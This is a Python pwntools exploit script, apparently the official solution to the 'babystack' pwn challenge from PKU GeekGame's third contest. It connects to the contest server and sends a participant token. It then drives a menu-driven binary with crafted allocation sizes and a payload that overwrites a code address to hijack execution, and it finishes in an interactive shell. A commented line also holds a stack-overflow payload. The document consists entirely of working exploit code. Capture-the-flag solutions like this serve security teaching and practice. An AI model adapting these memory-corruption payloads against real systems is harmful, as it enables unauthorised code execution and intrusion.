# https://github.com/PKU-GeekGame/geekgame-3rd/blob/master/official_writeup/prob10-babystack/sol/babystack.py
from pwn import *

context(log_level='debug', arch='amd64', os='linux')
#  nc prob12.geekgame.pku.edu.cn 10012
# p = remote("thuctf.redbud.info", 49310)
p = remote("prob12.geekgame.pku.edu.cn", 10012)
p.recvuntil("Please input your token: ")
p.sendline(b"256:MEYCIQDRGm_v_YIBd5HzshlAQwahPR0eXiFMI_zAzZU-JLvAFQIhAO6SCgDNRpeZMHHqc6G6zi_B6IEYFis9m8q7Nq5xMV9H")
# p.recvuntil("EOF included!)\n")
# p.sendline(b"0")
# p.sendline(b"a"*0x78+p64(0x40134e)+p64(0x4011b6))

p.recvuntil(">> \n")
p.sendline(b"1")
p.recvuntil("please enter the node key:\n")
p.sendline(b"1")
p.recvuntil("please enter the size of the data:")
p.sendline(f"{512-24-24}".encode())
p.recvuntil("please enter the data:")
p.sendline(b"-"*6)

p.recvuntil(">> \n")
p.sendline(b"1")
p.recvuntil("please enter the node key:\n")
p.sendline(b"4")
p.recvuntil("please enter the size of the data:")
p.sendline(b"0")
p.recvuntil("please enter the data:")
p.sendline(b"12345678"+p64(0x401234))

p.sendline(b"4")

p.interactive()
